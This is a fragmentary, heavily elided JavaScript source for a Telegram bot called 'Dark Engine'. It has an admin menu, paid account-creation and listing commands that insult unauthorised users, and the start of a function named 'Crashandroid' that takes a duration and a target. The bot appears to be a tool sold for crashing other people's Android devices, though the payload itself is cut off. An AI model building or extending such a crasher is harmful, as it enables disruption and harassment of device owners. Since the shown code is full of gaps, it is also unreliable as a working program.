...
const getHeader = (ctx) => {
    ...
    return `
<blockquote>💢 Admin Setting ☇ Control\nWhere Are To ${username}, To Bot Control Apps Dark Engine Version 1.0 Gen 1</blockquote>
━━━━━━━━━━━━━━━
<blockquote>Apss Information</blockquote>
メ NameBot : @${botUser}
メ NameApps : Dark Engine
メ Version : 1.0 Gen 1
メ CreateBase : @Danz_MD
メ Server : Online⚡
メ Runtime : ${runtime}
━━━━━━━━━━━━━━━`;
};
...
`;
    ...
    const keyboardMain = Markup.inlineKeyboard([
        ...
        [
            ...
            Markup.button.url('Developer ϟ Apps', 'https://t.me/Danz_MD')
        ]
    ]);

    // 4. Kirim Pesan Awal (Foto + Menu)
    await ctx.replyWithPhoto(
        { url: "https://files.catbox.moe/hbnokf.jpg" }, 
        {
            caption: textMain,
            parse_mode: "HTML",
            ...keyboardMain
...
bot.command("CreateAccount", async (ctx) => {
  ...
  // 2. Validasi Akses
  if (!isOwner(userId) && !isAuthorized(userId)) {
    return ctx.reply("😹—Lu siapa tolol, Buy Account Only @Keiraaa_md");
  }
  ...
  try {
    ...
    await ctx.telegram.sendMessage(
      ...
      `<b>📢 System Sudah Membuat Akun Untuk anda Harap Login Ke akun Anda, Jika Ada Masalah? Hubungi @Danz_MD</b>\n\n` +
...
bot.command("listakun", async (ctx) => {
  ...
  let teks = `<blockquote>☘️ All Account Apps Dark Engine</blockquote>\n\n`;
...
async function Crashandroid(durationHours, X) {
  const totalDurationMs = durationHours * 999999999999999999;
